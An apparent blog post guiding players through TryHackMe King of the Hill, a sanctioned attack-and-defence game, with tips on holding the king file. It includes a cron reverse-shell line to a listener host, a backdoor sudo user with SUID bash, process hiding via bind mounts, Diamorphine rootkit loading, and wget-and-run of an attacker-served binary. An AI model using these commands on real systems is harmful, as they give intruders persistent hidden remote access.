---
title: TryHackMe KoTH
published: 2024-05-05
tags: [KoTH, linux, windows, king, tryhackme, hacking, shells, documentation, tips-and-tricks]
category: TryHackMe 
draft: false 
---

# TryHackMe King Of The Hill 

- [Introduction](#introduction)
  * [How To Play?](#how-to-play-)
  * [Getting Started](#getting-started)
- [Persistence](#persistence)
- [Process Monitoring](#process-monitoring)
- [Process Hiding](#process-hiding)
- [Manipulate The King File](#manipulate-the-king-file)
  * [Chattr](#chattr)
    + [Level Up Chattr](#level-up-chattr)
      - [**More Flags To Chattr**:](#--more-flags-to-chattr---)
      - [**Loops**:](#--loops---)
  * [Mount Trick](#mount-trick)
    + [More Examples:](#more-examples-)
  * [A Combination!](#a-combination-)
  * [LKMs / Rootkits](#lkms---rootkits)
    + [Diamorphine](#diamorphine)
    + [UserLand Rootkits](#userland-rootkits)
- [Trolling](#trolling)
  * [Aliases](#aliases)
  * [Nyancat](#nyancat)
  * [Custom `.bashrc`](#custom--bashrc-)
- [Windows Machines](#windows-machines)
    + [Solution](#solution-)
      - [Examples](#examples-)
  * [The End](#the-end) 



## Introduction


KoTH? Think of it as your ultimate playground for practicing both attack and defense strategies. And this whole repo is about KoTH for newbies and and even for pros.

### How To Play? 

> Develop reconnaissance, offensive techniques, and most importantly, Linux proficiency. Mastering Linux is fundamental for excelling in KOTH.

- **Attack**: Attack the given machine and gain root user 
- **Find flags**: Flags will increase your points.
- **Be the King**: More king time means more points.
- **Do Not Cheat**: Please DO NOT CHEAT, at least when I'm there.


### Getting Started 

- Learn the Basics: Before diving into advanced challenges, make sure you have a solid understanding of basic cyber security concepts, including networking, Linux command line, web technologies, and common vulnerabilities.


- Practice Regularly: Consistent practice is key to improving your skills. Spend time on platforms like TryHackMe to tackle various challenges and gain hands-on experience.

- Tools like tmux can help for efficiently managing multiple panes and windows can significantly enhance your performance in KOTH challenges.

- Creating custom aliases can expedite the process of exploiting a box, thereby saving valuable time for patching and maintaining king persistence. 

- Notes: Having completed, neat notes of koth boxes, and one liners can come in handy and save up time. 

- Master Keyboard Shortcuts: Learning keyboard shortcuts for your terminal emulator, text editor, and other tools can significantly improve your workflow efficiency. This includes shortcuts for navigating, editing, and executing commands.



## Persistence 

* Within the context of shell connections, interruptions are frequent occurrences, leading to disconnections or errors that may impede your operations.

* In such instances, implementing persistence stands out as the most effective solution.

* I've listed some ways to establish persistence: 

1. A user with sudo privs:

```bash
newUser() {
    echo -e "\033[0;32m[+] - New User Config " && echo -e "\n"
    echo -e "\033[0;32m[+] - Enter a name for the new user: "
    read Newuser 
    adduser $Newuser 
    usermod -aG sudo $Newuser 
    chmod u+s /bin/bash
    echo -e "${RESET}"
}
newUser 
``` 

2. Utilizing cronjobs to get shells:

```bash
lhost="your lhost"
lport="your lport"
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'" | sudo tee -a /etc/crontab >/dev/null 2>&1
``` 

3. ssh Key Generation

```bash
sshConfig() {
    for user_dir in /home/*; do
        if [[ -d "$user_dir" && ! -L "$user_dir" && "$(basename "$user_dir")" != "lost+found" ]]; then
        username=$(basename "$user_dir")
            if [[ ! -f "$user_dir/.ssh/id_rsa" && ! -f "$user_dir/.ssh/id_rsa.pub" ]]; then
                echo "Generating SSH keys for user: $username"
                sudo -u "$username" ssh-keygen -t rsa -b 4096 -N "" -f "$user_dir/.ssh/id_rsa"
            else
                echo "SSH keys already exist for user: $username"
            fi
        fi
    done 
    echo -e "\033[0;32m[+] - SSH key generation complete."
    echo -e "${RESET}"

} 
sshConfig 
```


* You can find a lot more persistence tricks from [DynastyPersist](https://github.com/Trevohack/DynastyPersist) 


## Process Monitoring

* When it comes to keeping an eye on what's happening within your system, there are several handy tools available. Here are a couple of notable ones:

* You can find all these utilities with additional scripts in this repo.

1. Snoopy:
   Snoopy is a powerful tool for monitoring system activity, particularly focusing on tracking executed commands. It logs commands executed by users, providing valuable insights into system usage and potential security breaches.

   ```bash
   cat /var/log/auth.log # it's /var/log/secure in cent os boxes
   tail -f /var/log/auth.log # it's /var/log/secure in cent os boxes
   ``` 

2. pspy:
  pspy is another excellent process monitoring tool that operates at a lower level than traditional process monitoring utilities. It enables you to observe processes and their activity in real-time, including hidden or background processes, offering a comprehensive view of system operations.
    ```
    ./pspy 
    ./pspy -f -i 1000
    ```  

## Process Hiding 

* Process hiding is a technique used to conceal specific processes from system monitoring tools and users, enabling attackers to evade detection and maintain persistence on compromised systems.


1. Mount trick:
   ```bash
   mount -o bind /tmp /proc/<pid of process>
   ``` 
   - This will hide your process from `ps aux` output, however, it can be easily removed. 

2. Use a LKM/Rootkit, a popular one is diamorphine. 


## Manipulate The King File

* You probably read it this far to find the **important** king tricks, well here are some for you! 

### Chattr 

* `chattr` is a Linux command used to change file attributes, such as making a file immutable or append-only, enhancing file security.

* You can use chattr like this:

```bash
echo Trevohack > /root/king.txt
chattr +i /root/king.txt
``` 

* Later on, if you check `lsattr` at `/root/king.txt`, you'll see an `i` flag meaning it's immutable. With this shield in place, no one can write to `/root/king.txt`.

#### Level Up Chattr 

* You can level up chattr with quite a lotta ways, includng: 

##### **More Flags To Chattr**: 
- Use `chattr` with more flags with `i`
- `chattr +ia /root/king.txt` set immutable and append-only flags
- `chattr +iaud /root/king.txt` set immutable attribute, append-only attribute, undeletable  attribute, no-dump attribute.
  
##### **Loops**: 
- Run a loop to maintain king! How? Here's the answer:

1. Using a while loop with redirected output to `/dev/null`:
```bash
while true; do chattr -ia /root/king.txt 2>/dev/null; echo -n "Trevohack" > /root/king.txt 2>/dev/null; chattr +ia /root/king.txt 2>/dev/null; sleep 0.9; done > /dev/null &
``` 

2. Utilizing `nohup` for resilience and redirecting output to `/dev/null`:
```bash
nohup sh -c 'while true; do chattr -ia /root/king.txt 2>/dev/null; echo -n "Trevohack" > /root/king.txt 2>/dev/null; chattr +ia /root/king.txt 2>/dev/null; sleep 0.5; done' >/dev/null 2>&1 &
``` 

3. A while loop with a check (Not Recommended):
```bash
username="Trevohack"; king="/root/king.txt"; while true; do if [ "$(cat $king)" != "$username" ]; then umount -l /root/king.txt >/dev/null 2>&1; chattr -ia /root/king.txt >/dev/null 2>&1; echo "$username" > "$king" >/dev/null 2>&1; chattr +ia /root/king.txt; fi; sleep 0.5; done > /dev/null 2>&1 & 
``` 

### Mount Trick 

- A read-only mount is a configuration in which a filesystem or directory is made inaccessible for writing, ensuring data integrity and system stability.

- Example: 
```bash
echo Trevohack > /usr/share/trev
mount --bind -o ro /usr/share/trev /root/king.txt
``` 

* You can undo this my doing `umount -l /root/king.txt`

#### More Examples:

1. Lock `/root/king.txt` (Read-only filesystem). For this to work, you should first have your username in `/root/king.txt`.
```bash
mount --bind -o ro /root/king.txt /root/king.txt
``` 

2. Temporary Lockdown:
If you want to temporarily lock a file to prevent accidental modifications, you can mount it as read-only:
```bash
mount -o ro /path/to/file /mount/point
``` 

3. Lockdown with Bind Mounts:
You can also use bind mounts to create a read-only view of a directory containing the file:
```bash
mount --bind -o ro /path/to/directory /mount/point
``` 

### A Combination! 

- This is a combination of mount tricks and chattr 
```bash
username="Trevohack"; king="/root/king.txt"; while true; do if [ "$(cat $king)" != "$username" ]; then umount -l /root/king.txt >/dev/null 2>&1; chattr -ia /root/king.txt >/dev/null 2>&1; echo "$username" > "$king" >/dev/null 2>&1; chattr +ia /root/king.txt; mount --bind -o ro /root/king.txt /root/king.txt;fi; sleep 0.5; done > /dev/null 2>&1 & 
``` 

- Now, if you write to `/root/king.txt`, it will pop up a `Read-only filesystem` error and you won't be able to write to the king file unless you find it's pid and kill it.

* However, mount loops can sometimes cause the machine to lag or break, so I'd not recommend to use it.

### LKMs / Rootkits

- Only a handful of players have their own sneaky rootkits to stay king for longer. It's because whipping up a custom rootkit for every kernel on all those koth boxes is a real pain in the neck. And let's not even get started on trying to build a custom LKM from scratch—that's like trying to climb Mount Everest without a map. You gotta be a real Linux kernel G for that! 

- However, I'll point out a few strategies that involve LKMs

#### Diamorphine 

1. First things first, hop onto the Diamorphine train by cloning it from here straight into your cozy Docker container (Ubuntu 18.04 lts). Then go ahead and build it using the installation steps provided in it's repo. 

2. You'll get a `diamorphine.ko` file (kernel module), when playing KOTH transfer it to the box. 

3. Once, the file is transfered run `insmod diamorphine.ko` to insert our LKM to the box's kernel. 

* Now, you can go through Diamorphine's docs and find out the magic it can do. 

* Here are some of it's features:

```bash
root@panda ~ kill -64 0 # Promtes to root user. 
root@panda ~ mkdir dynasty_persist # Any thing starting with dynasty will be hidden.
root@panda ~ kill -31 <process_pid> # Hides processors
root@panda ~ lsmod | grep -i diamorphine # Hides itself 
root@panda ~ kill -63 0 # Make it appear in lsmod output
``` 


* It's up to your own imagination what you can do with diamorphine and other aspects discussed. 

* Further, if you want to stop insertion of modules to the kernel, you can use `sysctl`:
```bash
sudo sysctl -w kernel.modules_disabled=1
```

#### UserLand Rootkits

* Userland rootkits are malicious software tools designed to gain unauthorized control over a system by targeting the user space (or `userland`) of an operating system, as opposed to the kernel space.

* **User Space vs. Kernel Space**: Userland rootkits operate in the user space, where most regular applications run, unlike kernel rootkits which operate in the more privileged kernel space.

**Techniques and Methods**:

- **Library Injection**: They often use techniques such as injecting malicious code into system libraries (like `DLLs` on Windows or shared libraries on Unix/Linux systems). This allows them to intercept and modify system calls made by legitimate applications.
- **Process Hiding**: Userland rootkits can hide their processes by manipulating system APIs that report process information.
- **File Hiding**: They can also hide files by intercepting file system calls and filtering out entries that match specific criteria.
- **Network Activity Hiding**: Some `userland` rootkits can hide network connections or redirect network traffic.

**Examples and Tools**:

- **LD_PRELOAD on Linux**: A common technique on Linux systems is using the `LD_PRELOAD` environment variable to load a malicious shared library before any other libraries, allowing the rootkit to intercept and modify function calls.
- **Dynamic Linker Hijacking**: On Unix-like systems, userland rootkits may replace or manipulate the dynamic linker to load malicious code.
- Examples:
	- [crez](https://github.com/ngn13/cerez) 
	- [Jynx-Kit](https://github.com/chokepoint/jynxkit)
	- [Article](https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit)
	- [Windows Kit](https://github.com/forentfraps/rootkit-userland) 

## Trolling 

* Another fun part of koth is trolling!

### Aliases

* Aliases are shortcuts or alternate names for commands, files, or addresses, commonly used in computing for convenience and efficiency. 

* Here's how you can use aliases for defense/trolling:

```bash
alias cat=`ls -la`
echo "alias ls='exit' > /root/.bashrc"
echo "alias id='/tmp/nyancat' > /root/.bashrc"
```

### Nyancat

* `nyancat` is also another epic way to troll. Here's how to use it:
* Build your own `nyancat`: [nyan](https://github.com/klange/nyancat)

```bash
## Attacker 
$ python3 -m http.server 80

## Victim 
$ wget 10.10.x.x/nyancat -O .nyan && chmod +x .nyan
$ ./.nyan > /dev/pts/{num}
```

### Custom `.bashrc` 

* Create a custom `.bashrc` file, this can be used to configure how the terminal functions when using `bash`
* There are dozens of code examples online, you can read them, and create your own


## Windows Machines

* Up to now, only two windows machines are present: `offline h1-medium`

* Also, these boxes are easy to pwn, however, most people find it confusing to protect king file in windows boxes

#### Solution:

* `attrib` is a program/binary for windows boxes similar to `chattr` 

##### Examples:
1. `attrib +a king.txt` - Sets the archive attribute, indicating the file is ready for backup 
2. `attrib +s king.txt` - Marks the file as a system file, which is typically hidden from standard views
3. `attrib +r king.txt` - Makes the file read-only, preventing modifications
4. `attrib +h king.txt` - Hides the file from normal directory listings
5. `attrib +a +s +r +h king.txt` - Sets the archive, system, read-only, and hidden attributes, effectively locking the file 

* Batch file to run these commands in a loop: 
```powershell
@echo off
:loop
(
    attrib -a -s -r -i C:\king.txt
    echo Trevohack > C:\king.txt
    attrib +a +s +r +i C:\king.txt
)
goto loop 
```

* Secure your loop: 
```powershell
schtasks /create /tn "LockFileTask" /tr "C:\Windows\sys.bat" /sc onstart /rl highest /f schtasks /run /tn "LockFileTask"
```

- **Scheduled Task**: The `schtasks` command creates a scheduled task named "LockFileTask" that runs `lockfile.bat` on system startup with the highest privileges
- **/sc onstart**: Specifies that the task should run at system startup 
- **/rl highest**: Runs the task with the highest privileges
- **/f**: Forces the task creation without confirmation
- **/run**: Immediately starts the task


## The End 

That's it for now, catch ya later! 
